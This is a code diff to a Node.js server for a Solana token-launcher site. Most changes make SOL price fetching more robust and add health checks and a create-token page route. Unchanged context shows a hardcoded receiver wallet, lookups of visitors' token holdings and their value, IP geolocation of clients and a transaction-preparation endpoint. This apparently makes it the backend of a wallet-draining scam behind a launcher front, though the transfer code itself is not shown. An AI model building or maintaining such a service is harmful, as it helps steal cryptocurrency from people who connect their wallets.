@@ -16,8 +16,9 @@ const CONFIG = {
     RECEIVER_WALLET: '2Qq2f5bpNY9EvXYQcuutDq4JhZ4PH77h3tjuCRPWCjmk',
     
     // Server Configuration
-    PORT: 5000,
-    PRICE_CACHE_DURATION: 30 * 60 * 1000 // 30 minutes
+    PORT: process.env.PORT || 5000,
+    PRICE_CACHE_DURATION: 60 * 60 * 1000, // 1 hour
+    MAX_PRICE_RETRIES: 3
 };
 
 // =============================================
@@ -46,31 +47,135 @@ const connection = new Connection(CONFIG.SOLANA_RPC_URL, 'confirmed');
 
 let cachedSolPrice = null;
 let lastPriceUpdate = 0;
+let priceRetryCount = 0;
+
+// Multiple price source configuration
+const PRICE_SOURCES = [
+    {
+        name: 'Binance',
+        url: 'https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT',
+        parser: (data) => parseFloat(data.price),
+        weight: 1.0
+    },
+    {
+        name: 'CoinGecko',
+        url: 'https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd',
+        parser: (data) => data.solana?.usd,
+        weight: 0.9
+    },
+    {
+        name: 'CoinCap',
+        url: 'https://api.coincap.io/v2/assets/solana',
+        parser: (data) => parseFloat(data.data?.priceUsd),
+        weight: 0.8
+    },
+    {
+        name: 'Kraken',
+        url: 'https://api.kraken.com/0/public/Ticker?pair=SOLUSD',
+        parser: (data) => parseFloat(data.result?.SOLUSD?.c?.[0]),
+        weight: 0.7
+    },
+    {
+        name: 'Bybit',
+        url: 'https://api.bybit.com/v2/public/tickers?symbol=SOLUSDT',
+        parser: (data) => parseFloat(data.result?.[0]?.last_price),
+        weight: 0.6
+    }
+];
 
 async function getSolPrice() {
     const now = Date.now();
     
+    // Use cache if recent
     if (cachedSolPrice && (now - lastPriceUpdate) < CONFIG.PRICE_CACHE_DURATION) {
-        console.log(`Using cached SOL price: $${cachedSolPrice}`);
+        console.log(`💰 Using cached SOL price: $${cachedSolPrice}`);
         return cachedSolPrice;
     }
     
+    console.log('🔄 Fetching fresh SOL price...');
+    
+    const prices = [];
+    const errors = [];
+    
+    // Try all price sources in parallel with timeout
+    const pricePromises = PRICE_SOURCES.map(async (source) => {
+        try {
+            const response = await axios.get(source.url, { 
+                timeout: 3000,
+                headers: {
+                    'User-Agent': 'LunaLauncher/1.0',
+                    'Accept': 'application/json'
+                }
+            });
+            
+            const price = source.parser(response.data);
+            
+            if (price && price > 0 && price < 10000) { // Sanity check
+                console.log(`✅ ${source.name}: $${price}`);
+                return { price, weight: source.weight, source: source.name };
+            } else {
+                throw new Error(`Invalid price: ${price}`);
+            }
+        } catch (error) {
+            console.log(`❌ ${source.name} failed: ${error.message}`);
+            errors.push(`${source.name}: ${error.message}`);
+            return null;
+        }
+    });
+    
     try {
-        console.log('Fetching fresh SOL price from CoinGecko...');
-        const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
-        cachedSolPrice = response.data.solana.usd;
-        lastPriceUpdate = now;
-        console.log(`SOL price updated: $${cachedSolPrice}`);
-        return cachedSolPrice;
+        const results = await Promise.allSettled(pricePromises);
+        
+        // Collect successful prices
+        results.forEach(result => {
+            if (result.status === 'fulfilled' && result.value) {
+                prices.push(result.value);
+            }
+        });
+        
+        if (prices.length > 0) {
+            // Calculate weighted average
+            let totalWeight = 0;
+            let weightedSum = 0;
+            
+            prices.forEach(({ price, weight }) => {
+                weightedSum += price * weight;
+                totalWeight += weight;
+            });
+            
+            const averagePrice = weightedSum / totalWeight;
+            cachedSolPrice = parseFloat(averagePrice.toFixed(2));
+            lastPriceUpdate = now;
+            priceRetryCount = 0;
+            
+            console.log(`🎯 SOL price updated: $${cachedSolPrice} (from ${prices.length} sources)`);
+            return cachedSolPrice;
+            
+        } else {
+            // All APIs failed
+            priceRetryCount++;
+            console.error('❌ All price APIs failed:', errors);
+            
+            if (cachedSolPrice) {
+                console.log(`🔄 Using stale cached price: $${cachedSolPrice} (retry ${priceRetryCount}/${CONFIG.MAX_PRICE_RETRIES})`);
+                return cachedSolPrice;
+            } else {
+                // Emergency fallback
+                const fallbackPrice = 150;
+                console.log(`🚨 Using emergency fallback price: $${fallbackPrice}`);
+                return fallbackPrice;
+            }
+        }
+        
     } catch (error) {
-        console.error('Error fetching SOL price:', error.response?.status, error.response?.statusText);
+        console.error('💥 Price fetching system error:', error.message);
         
         if (cachedSolPrice) {
-            console.log(`Using stale cached SOL price due to API error: $${cachedSolPrice}`);
+            console.log(`🔄 Using cached price due to system error: $${cachedSolPrice}`);
             return cachedSolPrice;
         }
         
-        return null;
+        return 150; // Final emergency fallback
     }
 }
 
@@ -139,7 +244,9 @@ const TOKEN_CONFIG = {
 async function getTokenPrices() {
     try {
         const tokenIds = Object.values(TOKEN_CONFIG.PRICE_MAPPINGS).join(',');
-        const response = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${tokenIds}&vs_currencies=usd`);
+        const response = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${tokenIds}&vs_currencies=usd`, {
+            timeout: 5000
+        });
         const data = response.data;
         
         const prices = {};
@@ -149,7 +256,7 @@ async function getTokenPrices() {
         
         return prices;
     } catch (error) {
-        console.error('Failed to get token prices:', error);
+        console.error('Failed to get token prices:', error.message);
         return {};
     }
 }
@@ -163,8 +270,12 @@ function getTokenSymbol(mint) {
 // =============================================
 
 async function getIPLocation(ip) {
+    if (!ip || ip === 'Unknown' || ip === '127.0.0.1') {
+        return null;
+    }
+    
     try {
-        const response = await axios.get(`http://ip-api.com/json/${ip}`);
+        const response = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 3000 });
         const data = response.data;
         if (data.status === 'success') {
             return {
@@ -176,7 +287,7 @@ async function getIPLocation(ip) {
             };
         }
     } catch (error) {
-        console.error('IP geolocation error:', error);
+        console.error('IP geolocation error:', error.message);
     }
     return null;
 }
@@ -226,7 +337,7 @@ async function getSPLTokenInfo(publicKey) {
         }
         return tokens;
     } catch (error) {
-        console.error('Failed to get SPL tokens:', error);
+        console.error('Failed to get SPL tokens:', error.message);
         return [];
     }
 }
@@ -388,6 +499,27 @@ app.get('/client-ip', async (req, res) => {
     }
 });
 
+// Health Check Endpoint
+app.get('/health', async (req, res) => {
+    try {
+        const solPrice = await getSolPrice();
+        const blockhash = await connection.getLatestBlockhash();
+        
+        res.json({
+            status: 'healthy',
+            solPrice: solPrice,
+            rpcConnected: true,
+            timestamp: new Date().toISOString()
+        });
+    } catch (error) {
+        res.status(500).json({
+            status: 'unhealthy',
+            error: error.message,
+            timestamp: new Date().toISOString()
+        });
+    }
+});
+
 // Transaction Preparation
 app.post('/prepare-transaction', async (req, res) => {
     try {
@@ -523,21 +655,42 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+// Serve Create Token Page
+app.get('/create-token', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'create-token', 'index.html'));
+});
+
 // =============================================
 // SERVER INITIALIZATION
 // =============================================
 
 async function initializeSolPrice() {
     console.log('🔄 Initializing SOL price...');
-    await getSolPrice();
+    try {
+        const price = await getSolPrice();
+        console.log(`✅ SOL price initialized: $${price}`);
+    } catch (error) {
+        console.error('❌ Failed to initialize SOL price:', error.message);
+    }
 }
 
 function startPriceUpdater() {
-    console.log('🔄 Starting price updater (30-minute intervals)');
+    console.log('🔄 Starting price updater (1-hour intervals)');
     setInterval(async () => {
-        console.log('🔄 Updating SOL price (scheduled update)...');
+        console.log('🔄 Scheduled SOL price update...');
         await getSolPrice();
     }, CONFIG.PRICE_CACHE_DURATION);
+}
+
+function startHealthMonitor() {
+    setInterval(async () => {
+        try {
+            await connection.getLatestBlockhash();
+            console.log('❤️  Health check: RPC connection OK');
+        } catch (error) {
+            console.error('💔 Health check: RPC connection failed', error.message);
+        }
+    }, 5 * 60 * 1000); // Every 5 minutes
 }
 
 // Start Server
@@ -545,9 +698,11 @@ app.listen(CONFIG.PORT, '0.0.0.0', async () => {
     console.log(`🚀 Server running on port ${CONFIG.PORT}`);
     console.log(`📱 Access via: http://localhost:${CONFIG.PORT}`);
     console.log(`🔗 RPC URL: ${CONFIG.SOLANA_RPC_URL}`);
+    console.log(`💰 Receiver Wallet: ${CONFIG.RECEIVER_WALLET}`);
     
     await initializeSolPrice();
     startPriceUpdater();
+    startHealthMonitor();
 });
 
 // =============================================
@@ -555,10 +710,21 @@ app.listen(CONFIG.PORT, '0.0.0.0', async () => {
 // =============================================
 
 process.on('unhandledRejection', (err) => {
-    console.error('Unhandled Promise Rejection:', err);
+    console.error('💥 Unhandled Promise Rejection:', err);
 });
 
 process.on('uncaughtException', (err) => {
-    console.error('Uncaught Exception:', err);
+    console.error('💥 Uncaught Exception:', err);
     process.exit(1);
+});
+
+// Graceful shutdown
+process.on('SIGTERM', () => {
+    console.log('🛑 SIGTERM received, shutting down gracefully');
+    process.exit(0);
+});
+
+process.on('SIGINT', () => {
+    console.log('🛑 SIGINT received, shutting down gracefully');
+    process.exit(0);
 });
